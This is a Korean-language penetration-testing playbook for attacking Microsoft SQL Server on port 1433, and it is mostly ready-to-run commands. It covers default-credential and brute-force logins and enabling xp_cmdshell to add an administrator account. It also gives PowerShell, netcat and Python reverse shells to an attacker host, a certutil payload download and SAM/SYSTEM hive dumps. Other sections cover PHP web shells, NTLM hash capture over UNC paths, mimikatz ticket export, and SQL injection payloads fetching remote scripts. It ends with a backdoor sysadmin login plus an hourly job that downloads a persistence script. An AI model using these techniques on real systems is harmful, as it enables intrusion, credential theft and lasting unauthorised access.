# 🗄️ MSSQL ATTACKS (Port 1433)

> **목표: MSSQL 서비스 발견 후 25-30분 내에 시스템 명령 실행 또는 중요 데이터 접근**

## ⚡ 즉시 실행할 명령어들

### 🚀 MSSQL 발견 즉시 실행

```bash
# 1. MSSQL 포트 및 버전 확인
nmap -sV -p 1433 {IP}
nmap --script ms-sql-info -p 1433 {IP}

# 2. 기본 자격증명 즉시 시도
impacket-mssqlclient sa@{IP}
# Password 시도: (empty), sa, password, admin, 123456

# 3. MSSQL NSE 스크립트 실행 (백그라운드)
nmap --script ms-sql-* -p 1433 {IP} &

# 4. sqsh로 빠른 연결 시도 (Linux)
sqsh -S {IP} -U sa -P ''
sqsh -S {IP} -U sa -P 'sa'

# 5. 익명 접근 시도
sqsh -S {IP} -U '' -P ''
```

### ⚡ 연결 성공시 즉시 실행

```bash
# 기본 시스템 정보 확인
SELECT @@version;
SELECT system_user;
SELECT user;
SELECT db_name();

# xp_cmdshell 상태 확인
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# 데이터베이스 목록
SELECT name FROM sys.databases;
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (7분)

- [ ] **MSSQL 포트 확인** `nmap -p 1433 {IP}`
- [ ] **MSSQL 버전 및 인스턴스 확인**
- [ ] **기본 자격증명 시도** (sa, admin, mssql)
- [ ] **Windows 인증 vs SQL 인증 확인**
- [ ] **연결 가능 여부 확인**

### 🔍 Phase 2: 인증 및 권한 확인 (8분)

- [ ] **성공한 계정의 권한 확인** `IS_SRVROLEMEMBER('sysadmin')`
- [ ] **xp_cmdshell 활성화 상태 확인**
- [ ] **데이터베이스 목록 및 권한 확인**
- [ ] **링크된 서버 확인**
- [ ] **다른 사용자 계정 열거**

### 💥 Phase 3: 공격 및 명령 실행 (10분)

- [ ] **xp_cmdshell 활성화 시도**
- [ ] **시스템 명령 실행 테스트** `whoami, ipconfig`
- [ ] **리버스쉘 시도**
- [ ] **파일 시스템 접근 테스트**
- [ ] **중요 데이터 확인**

### 🐚 Phase 4: 지속적 접근 및 권한 상승 (5분)

- [ ] **사용자 추가 시도** (sysadmin 권한시)
- [ ] **백도어 생성**
- [ ] **다른 시스템으로 이동 시도**
- [ ] **크레덴셜 수집**

---

## 🎯 상황별 대응

### 🔓 기본 자격증명 성공시

```bash
# sa 계정으로 연결 성공
impacket-mssqlclient sa:{PASSWORD}@{IP}

# 또는 sqsh 사용
sqsh -S {IP} -U sa -P '{PASSWORD}'

# 연결 후 즉시 실행할 명령들:
SELECT @@version;
SELECT system_user;
SELECT user_name();
SELECT IS_SRVROLEMEMBER('sysadmin');

# 데이터베이스 정보
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;

# 사용자 정보
SELECT name FROM sys.sql_logins;
SELECT name FROM sys.server_principals WHERE type = 'S';
```

### 🖥️ xp_cmdshell 활용 (sysadmin 권한)

```bash
# xp_cmdshell 상태 확인
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# xp_cmdshell 활성화
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# 시스템 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'dir C:\';

# 사용자 추가 (관리자 권한)
EXEC xp_cmdshell 'net user hacker Password123! /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

# 파일 시스템 탐색
EXEC xp_cmdshell 'dir C:\Users\';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';

# 네트워크 정보
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'netstat -an';
EXEC xp_cmdshell 'arp -a';
```

### 🐚 리버스쉘 획득

```bash
# PowerShell 리버스쉘
EXEC xp_cmdshell 'powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient(\"{ATTACKER_IP}\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

# nc.exe 업로드 후 실행 (파일 업로드 가능한 경우)
EXEC xp_cmdshell 'certutil -urlcache -split -f http://{ATTACKER_IP}/nc.exe C:\temp\nc.exe';
EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe {ATTACKER_IP} 4444';

# Python 리버스쉘 (Python 설치된 경우)
EXEC xp_cmdshell 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"';
```

### 💾 데이터 수집 및 파일 접근

```bash
# 중요 데이터베이스 테이블 확인
USE master;
SELECT name FROM sys.databases;

# 특정 데이터베이스의 테이블 확인
USE [database_name];
SELECT * FROM sys.tables;

# 사용자 데이터 확인
SELECT * FROM users;
SELECT * FROM accounts;
SELECT username, password FROM login_table;

# 시스템 파일 읽기 (BULK INSERT 활용)
CREATE TABLE temp_table (data varchar(8000));
BULK INSERT temp_table FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM temp_table;
DROP TABLE temp_table;

# 파일 쓰기 (bcp 활용)
EXEC xp_cmdshell 'echo "test content" > C:\temp\test.txt';

# SAM/SYSTEM 파일 접근 시도
EXEC xp_cmdshell 'reg save HKLM\SAM C:\temp\sam.save';
EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\temp\system.save';
```

### 🔗 링크된 서버 악용

```bash
# 링크된 서버 확인
SELECT * FROM sys.servers;
EXEC sp_linkedservers;

# 링크된 서버를 통한 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];

# 링크된 서버의 데이터베이스 확인
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT name FROM sys.databases');

# 링크된 서버를 통한 권한 상승
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];
```

### 🔐 브루트포스 공격 (기본 자격증명 실패시)

```bash
# Hydra를 이용한 MSSQL 브루트포스
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{IP}
hydra -L users.txt -P passwords.txt mssql://{IP}

# 일반적인 MSSQL 계정들
hydra -L mssql_users.txt -P passwords.txt mssql://{IP}
# mssql_users.txt: sa, admin, mssql, sql, dbo, guest

# Medusa 사용
medusa -h {IP} -u sa -P /usr/share/wordlists/rockyou.txt -M mssql

# nmap 브루트포스
nmap --script ms-sql-brute -p 1433 {IP}

# Metasploit 브루트포스
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS {IP}
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## 🚨 문제 해결

### 🚫 MSSQL 연결 거부시

```bash
# 다른 MSSQL 포트 확인
nmap -p 1433,1434,1435,2433 {IP}

# UDP 1434 포트 확인 (SQL Server Browser)
nmap -sU -p 1434 {IP}

# 명명된 인스턴스 확인
nmap --script ms-sql-discover -p 1433 {IP}

# Windows 인증 시도
impacket-mssqlclient {DOMAIN}/{USERNAME}:{PASSWORD}@{IP} -windows-auth

# 연결 문자열 변경
sqsh -S {IP}:1433 -U sa -P ''
```

### 🔒 인증 실패시

```bash
# 다양한 사용자명 시도
users=("sa" "admin" "mssql" "sql" "dbo" "guest" "administrator")
passwords=("" "sa" "admin" "password" "123456" "Password123" "mssql")

for user in "${users[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Trying $user:$pass"
        timeout 5 sqsh -S {IP} -U $user -P "$pass" -C "SELECT 1" 2>/dev/null && echo "SUCCESS: $user:$pass"
    done
done

# Windows 도메인 인증 시도
impacket-mssqlclient {DOMAIN}/{USERNAME}@{IP} -windows-auth
```

### ⚙️ xp_cmdshell 활성화 실패시

```bash
# sp_oacreate를 통한 대안 (OLE Automation)
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami';

# sp_oadestroy로 정리
EXEC sp_oadestroy @shell;

# CLR Assembly를 통한 명령 실행 (고급)
# (이는 DBA 권한과 더 복잡한 설정이 필요)
```

### 🚫 권한 부족시

```bash
# 현재 권한 확인
SELECT
    p.permission_name,
    p.state_desc,
    pr.name
FROM sys.server_permissions p
LEFT JOIN sys.server_principals pr ON p.grantee_principal_id = pr.principal_id
WHERE pr.name = user_name();

# 다른 데이터베이스 접근 시도
EXEC sp_msforeachdb 'USE [?]; SELECT DB_NAME(), USER_NAME()';

# 암시적 권한 확인
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

# 다른 사용자로 가장 시도 (IMPERSONATE 권한 있는 경우)
EXECUTE AS LOGIN = 'sa';
SELECT system_user;
REVERT;
```

### 🔍 정보가 제한적일 때

```bash
# 메타데이터 수집
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns;

# 시스템 카탈로그 뷰 활용
SELECT * FROM sys.objects WHERE type = 'U';  -- 사용자 테이블
SELECT * FROM sys.procedures;                -- 저장 프로시저
SELECT * FROM sys.functions;                 -- 함수

# 에러 기반 정보 수집
SELECT 1/0;  -- 에러 메시지에서 정보 확인
SELECT CAST('text' AS int);  -- 형변환 에러
```

---

## 🔗 다른 서비스와 연계

### 🌐 웹 애플리케이션과 연계

```bash
# 웹 애플리케이션 크레덴셜로 MSSQL 접근
# web.config, connection string에서 발견한 크레덴셜 사용
impacket-mssqlclient '{WEB_DB_USER}:{WEB_DB_PASS}@{IP}'

# MSSQL에서 웹 디렉토리에 파일 쓰기
EXEC xp_cmdshell 'echo "<?php system($_GET[\"cmd\"]); ?>" > C:\inetpub\wwwroot\shell.php';

# 웹쉘 업로드
bcp "SELECT '<?php system($_GET[""cmd""]); ?>'" queryout "C:\inetpub\wwwroot\shell.php" -c -T
```

### 🗂️ SMB와 연계

```bash
# MSSQL 서비스 계정으로 SMB 접근 시도
# (NT SERVICE\MSSQLSERVER 등)

# UNC 경로를 통한 해시 수집 공격
EXEC xp_cmdshell 'dir \\{ATTACKER_IP}\share';
# Responder로 해시 수집

# SMB를 통한 파일 전송
EXEC xp_cmdshell 'copy C:\important.txt \\{ATTACKER_IP}\share\';
```

### 🔐 Active Directory와 연계

```bash
# AD 사용자 정보 확인
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';

# 도메인 컨트롤러 확인
EXEC xp_cmdshell 'nltest /dclist:{DOMAIN}';

# Kerberos 티켓 덤프 (mimikatz 활용)
EXEC xp_cmdshell 'mimikatz.exe "sekurlsa::tickets /export" exit';
```

---

## 🛠️ 고급 MSSQL 공격 기법

### 📊 SQL Injection을 통한 명령 실행

```bash
# 웹 애플리케이션의 SQL injection에서 xp_cmdshell 호출
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--

# UNION 기반 injection
' UNION SELECT 1,2,3,4,5 FROM OPENROWSET('SQLNCLI', 'Server={IP};Trusted_Connection=yes;', 'EXEC xp_cmdshell ''whoami''')--

# Stacked query injection
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}/shell.ps1\')"';--
```

### 🔍 MSSQL 정보 수집 자동화 스크립트

```bash
#!/bin/bash
IP=$1
USER=${2:-sa}
PASS=${3:-}

echo "=== MSSQL Information Gathering for $IP ==="

# 연결 테스트
echo "[+] Testing connection..."
impacket-mssqlclient $USER:$PASS@$IP -db master << EOF
SELECT @@version;
SELECT system_user;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
EXIT
EOF

echo "[+] Checking xp_cmdshell status..."
impacket-mssqlclient $USER:$PASS@$IP -db master << EOF
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
GO
EXIT
EOF

echo "[+] Listing databases..."
impacket-mssqlclient $USER:$PASS@$IP -db master << EOF
SELECT name FROM sys.databases;
GO
EXIT
EOF

echo "=== MSSQL Scan Complete ==="
```

### 🎭 MSSQL 지속성 및 백도어

```bash
# 새 로그인 생성 (sysadmin 권한)
CREATE LOGIN [backdoor] WITH PASSWORD = 'BackdoorPass123!';
ALTER SERVER ROLE sysadmin ADD MEMBER [backdoor];

# 스케줄된 작업 생성
EXEC msdb.dbo.sp_add_job
    @job_name = 'System Maintenance',
    @enabled = 1;

EXEC msdb.dbo.sp_add_jobstep
    @job_name = 'System Maintenance',
    @step_name = 'Cleanup',
    @command = 'powershell.exe -c "IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}/persistence.ps1\')"';

# 스케줄 설정 (매시간 실행)
EXEC msdb.dbo.sp_add_schedule
    @schedule_name = 'Hourly',
    @freq_type = 4,
    @freq_interval = 1,
    @freq_subday_type = 8,
    @freq_subday_interval = 1;

EXEC msdb.dbo.sp_attach_schedule
    @job_name = 'System Maintenance',
    @schedule_name = 'Hourly';
```

---

## ⏱️ 시간 관리 가이드

### 🎯 7분 안에 완료할 것들

- [ ] MSSQL 포트 및 버전 확인
- [ ] 기본 자격증명 시도 (sa, admin 등)
- [ ] 연결 성공시 기본 정보 수집
- [ ] sysadmin 권한 확인

### 🔍 20분 안에 완료할 것들

- [ ] xp_cmdshell 활성화 및 명령 실행 테스트
- [ ] 시스템 정보 수집 (whoami, ipconfig 등)
- [ ] 데이터베이스 및 테이블 열거
- [ ] 중요 데이터 확인

### 💥 30분 후 판단 기준

**성공 기준:**

- [ ] xp_cmdshell을 통한 시스템 명령 실행 성공
- [ ] 리버스쉘 획득 또는 사용자 추가 성공
- [ ] 중요 데이터베이스 데이터 접근
- [ ] 다른 시스템으로 이동 경로 확보

**중간 성공시 계속 진행:**

- [ ] 권한 상승 및 지속성 확보
- [ ] 크레덴셜 수집 및 다른 시스템 공격
- [ ] AD 환경시 도메인 공격 시도

**실패시 다음 단계:**

- [ ] 브루트포스를 백그라운드로 계속 실행
- [ ] SQL injection 가능한 웹 애플리케이션 확인
- [ ] 다른 데이터베이스 서비스 확인 (MySQL, PostgreSQL)
- [ ] 다른 포트/서비스로 우선순위 이동

**다음 단계**:

- 시스템 명령 실행 성공시 `PRIVILEGE-ESCALATION/windows-privesc/`로
- 리버스쉘 획득시 `SHELLS/` 폴더 참조
- 데이터만 접근 가능시 크레덴셜 수집 후 다른 서비스 공격
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
